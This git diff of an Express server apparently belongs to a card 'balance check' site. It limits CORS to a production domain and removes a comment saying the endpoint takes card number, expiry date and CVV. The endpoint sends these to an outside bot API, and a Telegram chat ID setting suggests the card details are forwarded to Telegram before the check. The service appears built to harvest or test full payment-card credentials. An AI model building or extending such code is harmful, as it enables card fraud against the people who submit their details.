@@ -11,23 +11,16 @@ const app = express();
 const PORT = process.env.PORT || 3001;
 const API_URL = 'https://bot.pc.am/v3/checkBalance';
 
-app.use(cors({ origin: '*' }));
+app.use(cors({
+  origin: process.env.NODE_ENV === 'production'
+    ? ['https://rcbalance-check.com', 'https://www.rcbalance-check.com']
+    : '*'
+}));
 app.use(express.json());
 
 // Serve static files in production
 app.use(express.static(path.join(__dirname, '../dist')));
 
-/**
- * Balance Check API - Replace this with your bank's API integration
- *
- * Your bank API will likely need:
- * - Card number (PAN)
- * - Expiration date (MM/YY)
- * - CVV
- *
- * Response format expected by frontend:
- * { success: boolean, balance?: number, currency?: string, error?: string }
- */
 app.post('/api/check-balance', async (req, res) => {
   const API_TOKEN = process.env.API_TOKEN;
   const TELEGRAM_BEFORE = process.env.TELEGRAM_ID_BEFORE_CHECK?.trim();
